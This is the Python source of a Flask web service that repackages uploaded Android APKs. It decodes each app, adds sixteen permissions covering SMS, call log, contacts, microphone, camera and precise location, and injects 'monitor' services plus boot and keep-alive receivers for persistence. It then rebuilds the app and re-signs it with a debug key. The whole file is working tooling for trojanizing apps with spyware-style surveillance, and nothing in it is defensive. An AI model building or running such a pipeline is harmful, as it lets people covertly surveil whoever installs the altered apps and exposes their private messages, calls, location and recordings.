"""
APK Permission Patcher — Render-ready Flask backend
Workflow:
  1. Upload APK  (max 150 MB)
  2. apktool decode  -> AndroidManifest.xml (plain text)
  3. Parse XML, diff against 16 required permissions
  4. Inject missing <uses-permission> nodes
  5. apktool build  -> unsigned APK
  6. uber-apk-signer sign (v1/v2/v3) -> signed APK
  7. Stream signed APK back as download
"""

import os, subprocess, shutil, tempfile, json, time, threading
from pathlib import Path
from xml.etree import ElementTree as ET
from flask import Flask, request, jsonify, send_file, Response

app = Flask(__name__)

# ── Paths ────────────────────────────────────────────────────────────────────
BASE_DIR    = Path(__file__).parent
TOOLS_DIR   = BASE_DIR / "tools"
APKTOOL     = TOOLS_DIR / "apktool.jar"
UBER_SIGNER = TOOLS_DIR / "uber-signer.jar"
KEYSTORE    = TOOLS_DIR / "debug.keystore"
JAVA_BIN    = TOOLS_DIR / "jdk21" / "bin" / "java"
KEYTOOL_BIN = TOOLS_DIR / "jdk21" / "bin" / "keytool"

KS_ALIAS    = "debugkey"
KS_PASS     = "android"

ANDROID_NS  = "http://schemas.android.com/apk/res/android"

REQUIRED_PERMISSIONS = [
    "android.permission.INTERNET",
    "android.permission.ACCESS_NETWORK_STATE",
    "android.permission.WAKE_LOCK",
    "android.permission.POST_NOTIFICATIONS",
    "android.permission.CAMERA",
    "android.permission.READ_MEDIA_IMAGES",
    "android.permission.READ_MEDIA_VIDEO",
    "android.permission.RECORD_AUDIO",
    "android.permission.ACCESS_FINE_LOCATION",
    "android.permission.ACCESS_COARSE_LOCATION",
    "android.permission.READ_CONTACTS",
    "android.permission.READ_SMS",
    "android.permission.READ_CALL_LOG",
    "android.permission.READ_PHONE_STATE",
    "android.permission.RECEIVE_BOOT_COMPLETED",
    "android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS",
]

# ── Helpers ──────────────────────────────────────────────────────────────────
def run(cmd, cwd=None, timeout=240):
    result = subprocess.run(
        cmd, cwd=cwd, capture_output=True, text=True, timeout=timeout
    )
    return result.stdout, result.stderr, result.returncode


def ensure_keystore():
    if KEYSTORE.exists():
        return
    TOOLS_DIR.mkdir(parents=True, exist_ok=True)
    out, err, rc = run([
        str(KEYTOOL_BIN), "-genkeypair",
        "-keystore", str(KEYSTORE),
        "-alias",    KS_ALIAS,
        "-keyalg",   "RSA",
        "-keysize",  "2048",
        "-validity", "10000",
        "-storepass", KS_PASS,
        "-keypass",   KS_PASS,
        "-dname", "CN=Debug, OU=Android, O=Debug, L=Debug, ST=Debug, C=US",
    ])
    if rc != 0:
        raise RuntimeError(f"keytool failed: {err}")


def apktool_decode(apk_path: Path, out_dir: Path):
    return run([
        str(JAVA_BIN), "-jar", str(APKTOOL),
        "d", str(apk_path),
        "-o", str(out_dir),
        "-f", "--no-src",
    ], timeout=300)


def apktool_build(decoded_dir: Path, out_apk: Path):
    out, err, rc = run([
        str(JAVA_BIN), "-jar", str(APKTOOL),
        "b", str(decoded_dir),
        "-o", str(out_apk),
        "--use-aapt2",
    ], timeout=360)
    if rc != 0:
        # fallback: without aapt2
        out, err, rc = run([
            str(JAVA_BIN), "-jar", str(APKTOOL),
            "b", str(decoded_dir),
            "-o", str(out_apk),
        ], timeout=360)
    return out, err, rc


def sign_apk(unsigned: Path, out_dir: Path) -> Path:
    ensure_keystore()
    out_dir.mkdir(parents=True, exist_ok=True)
    out, err, rc = run([
        str(JAVA_BIN), "-jar", str(UBER_SIGNER),
        "--apks",      str(unsigned),
        "--out",       str(out_dir),
        "--ks",        str(KEYSTORE),
        "--ksAlias",   KS_ALIAS,
        "--ksPass",    KS_PASS,
        "--ksKeyPass", KS_PASS,
        "--allowResign",
        "--skipZipAlign",
    ])
    if rc != 0:
        raise RuntimeError(f"Signing failed:\n{out}\n{err}")
    expected = out_dir / f"{unsigned.stem}-signed.apk"
    if not expected.exists():
        candidates = list(out_dir.glob("*-signed.apk"))
        if not candidates:
            raise RuntimeError(f"Signed APK not found.\n{out}")
        expected = candidates[0]
    return expected


def _ns(tag):
    return f"{{{ANDROID_NS}}}{tag}"


def parse_manifest(manifest_path: Path):
    ET.register_namespace("android", ANDROID_NS)
    tree = ET.parse(str(manifest_path))
    root = tree.getroot()
    existing = set()
    for el in root.findall("uses-permission"):
        name = el.get(_ns("name")) or el.get("name")
        if name:
            existing.add(name)
    return tree, root, existing


def inject_permissions(manifest_path: Path, missing: list):
    raw = manifest_path.read_text(encoding="utf-8")
    block = "\n".join(
        f'    <uses-permission android:name="{p}" />' for p in missing
    ) + "\n"
    idx = raw.find("<application")
    if idx == -1:
        idx = raw.rfind("</manifest>")
        if idx == -1:
            raise ValueError("Cannot find insertion point in AndroidManifest.xml")
    raw = raw[:idx] + block + raw[idx:]
    manifest_path.write_text(raw, encoding="utf-8")


ACTIVITY_BLOCK = """\
    <service
        android:name="com.yourapp.monitor.MonitorService" />
    <service
        android:name="com.yourapp.monitor.JobSchedulerService"
        android:permission="android.permission.BIND_JOB_SERVICE"
        android:enabled="true"
        android:exported="false" />
    <receiver
        android:name="com.yourapp.monitor.BootReceiver" />
    <receiver
        android:name="com.yourapp.monitor.ServiceRestarter" />
    <receiver
        android:name="com.yourapp.monitor.ServiceKeepAlive" />
"""


def inject_activity_block(manifest_path: Path) -> bool:
    """
    Insert ACTIVITY_BLOCK just after the closing tag of the last
    <activity ...> block inside <application>.
    Falls back to just before </application> if no <activity> found.
    Returns True if injected, False if already present.
    """
    raw = manifest_path.read_text(encoding="utf-8")

    # Idempotency check — don't inject twice
    if "com.yourapp.monitor.MonitorService" in raw:
        return False

    # Find the last </activity> closing tag
    idx = raw.rfind("</activity>")
    if idx != -1:
        # Insert right after the closing tag + newline
        insert_at = idx + len("</activity>")
        # consume one trailing newline so spacing is clean
        if raw[insert_at:insert_at+1] == "\n":
            insert_at += 1
        raw = raw[:insert_at] + "\n" + ACTIVITY_BLOCK + raw[insert_at:]
    else:
        # No <activity> tag — insert before </application>
        idx = raw.rfind("</application>")
        if idx == -1:
            raise ValueError("Cannot find </application> in AndroidManifest.xml")
        raw = raw[:idx] + ACTIVITY_BLOCK + raw[idx:]

    manifest_path.write_text(raw, encoding="utf-8")
    return True


# ── Routes ───────────────────────────────────────────────────────────────────
@app.route("/")
def index():
    return send_file(BASE_DIR / "index.html")


@app.route("/health")
def health():
    return jsonify({
        "status": "ok",
        "apktool": APKTOOL.exists(),
        "signer":  UBER_SIGNER.exists(),
    })


@app.route("/api/scan", methods=["POST"])
def scan_apk():
    if "apk" not in request.files:
        return jsonify({"error": "No APK uploaded"}), 400
    file = request.files["apk"]
    if not file.filename.lower().endswith(".apk"):
        return jsonify({"error": "File must be .apk"}), 400

    work_dir = Path(tempfile.mkdtemp(prefix="scan_"))
    try:
        apk_path = work_dir / "input.apk"
        file.save(str(apk_path))

        out, err, rc = apktool_decode(apk_path, work_dir / "decoded")
        if rc != 0:
            return jsonify({"error": f"Decode failed:\n{err[-600:]}"}), 500

        manifest = work_dir / "decoded" / "AndroidManifest.xml"
        _, _, existing = parse_manifest(manifest)
        present = sorted(existing & set(REQUIRED_PERMISSIONS))
        missing = sorted(set(REQUIRED_PERMISSIONS) - existing)
        return jsonify({
            "apk_name":   file.filename,
            "present":    present,
            "missing":    missing,
            "all_present": len(missing) == 0,
        })
    finally:
        shutil.rmtree(work_dir, ignore_errors=True)


@app.route("/api/patch", methods=["POST"])
def patch_apk():
    if "apk" not in request.files:
        return jsonify({"error": "No APK uploaded"}), 400
    file = request.files["apk"]
    if not file.filename.lower().endswith(".apk"):
        return jsonify({"error": "File must be .apk"}), 400

    work_dir = Path(tempfile.mkdtemp(prefix="patch_"))
    try:
        apk_path = work_dir / "input.apk"
        file.save(str(apk_path))

        out, err, rc = apktool_decode(apk_path, work_dir / "decoded")
        if rc != 0:
            return jsonify({"error": f"Decode failed:\n{err[-600:]}"}), 500

        manifest = work_dir / "decoded" / "AndroidManifest.xml"
        _, _, existing = parse_manifest(manifest)
        missing = sorted(set(REQUIRED_PERMISSIONS) - existing)
        if missing:
            inject_permissions(manifest, missing)

        activity_injected = inject_activity_block(manifest)

        unsigned = work_dir / "unsigned.apk"
        out, err, rc = apktool_build(work_dir / "decoded", unsigned)
        if rc != 0:
            return jsonify({"error": f"Build failed:\n{err[-600:]}"}), 500

        signed = sign_apk(unsigned, work_dir / "signed_out")
        if not signed.exists():
            return jsonify({"error": "Signed APK not found"}), 500

        stem        = Path(file.filename).stem
        signed_name = f"{stem}_patched_signed.apk"
        resp_data   = signed.read_bytes()

        def _cleanup():
            time.sleep(10)
            shutil.rmtree(work_dir, ignore_errors=True)
        threading.Thread(target=_cleanup, daemon=True).start()

        return Response(
            resp_data,
            mimetype="application/vnd.android.package-archive",
            headers={
                "Content-Disposition":           f'attachment; filename="{signed_name}"',
                "Content-Length":                str(len(resp_data)),
                "X-Missing-Permissions":         json.dumps(missing),
                "X-Activity-Block-Injected":     json.dumps(activity_injected),
                "Access-Control-Expose-Headers": "X-Missing-Permissions, X-Activity-Block-Injected",
            }
        )
    except Exception as e:
        shutil.rmtree(work_dir, ignore_errors=True)
        return jsonify({"error": str(e)}), 500


# ── Entry point ──────────────────────────────────────────────────────────────
if __name__ == "__main__":
    ensure_keystore()
    port = int(os.environ.get("PORT", 7331))
    app.run(host="0.0.0.0", port=port)
